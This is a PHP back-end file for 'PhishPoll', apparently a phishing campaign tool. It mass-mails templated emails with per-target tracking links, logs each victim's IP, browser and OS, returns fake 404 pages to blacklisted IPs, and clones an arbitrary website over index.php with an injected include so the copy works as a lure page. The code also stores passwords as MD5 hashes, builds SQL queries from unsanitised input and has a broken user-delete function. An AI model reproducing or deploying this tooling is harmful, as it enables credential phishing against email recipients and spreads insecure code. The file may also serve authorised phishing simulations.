<?php

// MySQL Info
include('db_conf.php');
// Mysql Info

// Create connection
$con = mysqli_connect($mysql_host,$mysql_user,$mysql_pass,$mysql_db);

// Check connection
if (mysqli_connect_errno($con))
{
	echo "Failed to connect to MySQL: " . mysqli_connect_error();
}

function checkBanned($ip)
{
	global $con;
	$banned = "SELECT id FROM blacklist WHERE ip='$ip' LIMIT 1";

	$result = mysqli_query($con, $banned);

	if(mysqli_num_rows($result) == 0)
	{
		// IP not banned, set session token and move on
		session_name("phishpoll");
		session_set_cookie_params(2*7*24*60*60);
		session_start();
		session_destroy();
		session_start();
		$_SESSION['uid'] = mysql_real_escape_string($_GET['uid']);
	}
	else
	{
		// IP is banned, nuke this fucker
		header('HTTP/1.0 404 Not Found');
		echo "<h1>404 Not Found</h1>";
		echo "The page that you have requested could not be found.";
		exit();
	}
}

function trackIP($browserName,$browserVersion,$os,$ip,$host,$campaign)
{
	global $con;
	
	$sanBrowser = mysql_real_escape_string($browserName);
	$sanVersion = mysql_real_escape_string($browserVersion);
	$sanOS = mysql_real_escape_string($os);
	$sanIP = mysql_real_escape_string($ip);
	$sanHost = mysql_real_escape_string($host);
	$sanCampaign = mysql_real_escape_string($campaign);
	$uid = $_SESSION['uid'];

        $getCampaignName = "SELECT name from campaigns where id='" . $sanCampaign . "'";
        $result = mysqli_query($con, $getCampaignName);
        $name = mysqli_fetch_assoc($result);
	
	$addIP = "INSERT INTO hits (ip, host, browser, browserVersion, os, campaign, uid) VALUES ('$sanIP', '$sanHost', '$sanBrowser', '$sanVersion', '$sanOS', '$name[name]', '$uid')";
	
	$result = mysqli_query($con, $addIP);	
}

function addToBanned($ip)
{
	global $con;
	
	$addBanned = "INSERT INTO blacklist (ip) VALUES ('" . mysql_real_escape_string($ip) . "')";
	
	$result = mysqli_query($con, $addBanned);

	if(mysqli_affected_rows($con) > 0)
	{
		return "$ip Added To Blacklist";
	}
	else
	{
		return "Error! $ip Not Added To Blacklist";
	}
}

function delFromBanned($ip)
{
	global $con;

	$sanIP = mysql_real_escape_string($ip);

	$delBanned = "DELETE FROM blacklist where ip='$sanIP'";

	$result = mysqli_query($con, $delBanned);

	if(mysqli_affected_rows($con) > 0)
	{
		return "$ip Removed From Blacklist";
	}
	else
	{
		return "$ip Was Not Blacklisted";
	}
}

function searchForBanned($ip)
{
	global $con;
	
	$searchBanned = "SELECT id FROM blacklist WHERE ip='" . mysql_real_escape_string($ip) . "' LIMIT 1";

	$result = mysqli_query($con, $searchBanned);

	if(mysqli_num_rows($result))
	{
		return "IP Address : $ip Found In Database";
	}
	else
	{
		return "IP Address : $ip Not Found In Database";
	}
}

function login($username,$password)
{
	global $con;
	
	session_name("phishpollLogin");
	session_set_cookie_params(2*7*24*60*60);
	session_start();
	session_destroy();
	session_start();

	$sanUser = mysql_real_escape_string($username);
	$sanPass = mysql_real_escape_string($password);

	$checkLogin = "SELECT username,password FROM users where username='$sanUser'";
	
	if ($result = mysqli_query($con, $checkLogin))
	{
		$user = mysqli_fetch_row($result);
		if ($sanUser == $user[0] && md5($sanPass) == $user[1])
		{
			$_SESSION['signed_in'] = true;
			$_SESSION['username'] = $sanUser;
			header("Location: index.php");
		} 
		else
		{
                	return "Failed";
		}
	}

}

function logout()
{
	session_name("phishpollLogin");
	session_start();
	$_SESSION = array();
	session_destroy();
	
	header("Location: /admin/login.php");
	exit();
}

function showStats($numResults = '1')
{
	global $con;

    function filter(&$value) 
    {
        $value = htmlspecialchars($value,  ENT_QUOTES);
    }

	$sanResults = mysql_real_escape_string(($numResults - 1) * 15);
	$showStats = "SELECT * FROM hits ORDER BY id DESC LIMIT $sanResults, 15";

	$results = mysqli_query($con, $showStats);
	
	$i = 0;		
	while($data = mysqli_fetch_array($results))
    {
        array_walk_recursive($data, "filter");
		if($i % 2 == 0)
		{
			echo <<< END
				<tr>
                                <td><input type="checkbox" /></td>
                                <td>$data[id]</td>
                                <td>$data[ip]</td>
                                <td>$data[host]</td>
                                <td>$data[browser]</td>
                                <td>$data[browserVersion]</td>
                                <td>$data[os]</td>
                                <td>$data[time]</td>
                                <td>$data[campaign]</td>
				<td>$data[uid]</td>
                                </tr>
END;
		}
		else
		{
			echo <<< END
                                 <tr class="alternate-row">
                                 <td><input type="checkbox" /></td>
                                 <td>$data[id]</td>
                                 <td>$data[ip]</td>
                                 <td>$data[host]</td>
                                 <td>$data[browser]</td>
                                 <td>$data[browserVersion]</td>
                                 <td>$data[os]</td>
                                 <td>$data[time]</td>
                                 <td>$data[campaign]</td>
				 <td>$data[uid]</td>
                                 </tr>
END;
		}
		$i++;
	}
}

function statGraph($numResults = '1')
{
	global $con;

	$sanResults = mysql_real_escape_string(($numResults - 1) * 15);

	$statGraph = "select MONTHNAME(time) as month, EXTRACT(day from time) AS day,count(*) as views FROM hits GROUP BY extract(day from time) ORDER BY time LIMIT $sanResults, 15";

	$results = mysqli_query($con, $statGraph);

	$xAxis = array();
	$yAxis = array();	
	while($data = mysqli_fetch_array($results))
	{
		array_push($xAxis, $data['month'] . "-" . $data['day']);
		array_push($yAxis, $data['views']);
	}
	return array($xAxis,$yAxis);
}

function addUser($user,$pass)
{
        global $con;

        $addUser = "INSERT INTO users (username,password) VALUES ('" . mysql_real_escape_string($user) . "','" . md5($pass) . "')";

        $result = mysqli_query($con, $addUser);

        if(mysqli_affected_rows($con) > 0)
        {
                return htmlspecialchars($user,ENT_QUOTES) . " Added To PhishPoll";
        }
        else
        {
                return "Error! User Not Added";
        }
}

function delUser($user)
{
        global $con;

        $sanIP = mysql_real_escape_string($user);

        $delBanned = "DELETE FROM users where user='$sanUser'";

        $result = mysqli_query($con, $delUser);

        if(mysqli_affected_rows($con) > 0)
        {
                return "$sanUser Removed From PhishPoll";
        }
        else
        {
                return "$sanUser Was Not Found";
        }
}

function searchForUser($user)
{
        global $con;

        $searchUser = "SELECT id FROM users WHERE user='" . mysql_real_escape_string($user) . "' LIMIT 1";

        $result = mysqli_query($con, $searchUser);

        if(mysqli_num_rows($result))
        {
                return "User : " . htmlspecialchars($user, ENT_QUOTES) . " Found In PhishPoll";
        }
        else
        {
                return "User : " . htmlspecialchars($user, ENT_QUOTES) . " Not Found In PhishPoll";
        }
}

function htaccess404Local($page)
{
	$f = "../.htaccess";
	file_put_contents($f, "ErrorDocument 404 /$page", FILE_APPEND);
	return "Redirecting 404 pages to " . htmlspecialchars($page,ENT_QUOTES); 
}

function htaccess404Remote($url)
{
}

function maxPages()
{
	global $con;
	
	$maxPages = "SELECT COUNT(id) FROM hits";

	$result = mysqli_query($con,$maxPages);

	$row = mysqli_fetch_row($result);

	$totalHits = $row[0];

	$totalPages = ceil($totalHits / 15);

	return $totalPages;
}

function createTemplate($template, $campaign)
{
	global $con;

	$sanTemplate = mysql_real_escape_string($template);
	$sanCampaign = mysql_real_escape_string($campaign);
	$addTemplate = "UPDATE campaigns SET template='" . $sanTemplate . "' WHERE name='" . $sanCampaign . "'";

	$result = mysqli_query($con, $addTemplate);

	if(mysqli_affected_rows($con))
	{
		return "Template Added To Campaign " . htmlspecialchars($campaign, ENT_QUOTES);
	}

	else
	{
		return "Please Enter A Valid Campaign Number";
	}

}

function createCampaign($name,$url)
{
	global $con;

	$sanName = mysql_real_escape_string($name);
	$sanURL = mysql_real_escape_string($url);

	$addCampaign = "INSERT INTO campaigns (name,url) VALUES ('" . $sanName . "','" . $sanURL . "')";

	$result = mysqli_query($con, $addCampaign);

	if(mysqli_affected_rows($con) > 0)
	{
		return "Created Campaign : " . htmlspecialchars($name,ENT_QUOTES);
	}

	else
	{
		return "Error While Creating Campaign; Please Try Again";
	}
}

function listCampaigns()
{
	global $con;

	$getCampaigns = "SELECT name from campaigns";

	$result = mysqli_query($con, $getCampaigns);

	echo "<select name='campaignName' id='campaignName'>";
        while($data = mysqli_fetch_array($result))
        {
		echo "<option value='" . $data['name'] . "' class='inp-form'>" . $data['name'] . "</option>";
	}
	echo "</select>";
}

function goPhish($campaignName,$emailFrom,$targets,$subject)
{
	global $con;
	
	$sanName = mysql_real_escape_string($campaignName); 
	$sanFrom = mysql_real_escape_string($emailFrom);
	
	$getURL = "SELECT url from campaigns where name='" . $sanName . "'";
	$result = mysqli_query($con, $getURL);
	$url = mysqli_fetch_assoc($result);

	$getCampaignID = "SELECT id from campaigns where name='" . $sanName . "'";
	$result = mysqli_query($con, $getCampaignID);
	$id = mysqli_fetch_assoc($result);

	$getTemplate = "SELECT template from campaigns where name='" . $sanName . "'";
	$result = mysqli_query($con, $getTemplate);
	$template = mysqli_fetch_assoc($result);

	foreach(explode("\n", $targets) as $line)
	{
		$uid = hash('sha512', $line);
								
		$phishURL = $url['url'] . "/?campaign=" . $id['id'] . "&uid=" . $uid;
		$email = str_replace("@@url@@", $phishURL, $template['template']);

		// To send HTML mail, the Content-type header must be set
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
//		$headers .= 'From: <' . $emailFrom . ">\r\n";

		mail($line, $subject, $email, $headers);
	}
}

function siteClone($url)
{
        $ch = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $userAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)";
        curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);

        $data = curl_exec($ch);
        curl_close($ch);
        
        $file = fopen("../index.php", "w");
        $template = str_replace("<head>", "<head><?php include('includes/include.php') ?><base href=" . $url . " target=\"_blank\">", $data);
        fwrite($file, $template);
        fclose($file);

        
        return "Check index.php";
}
?>
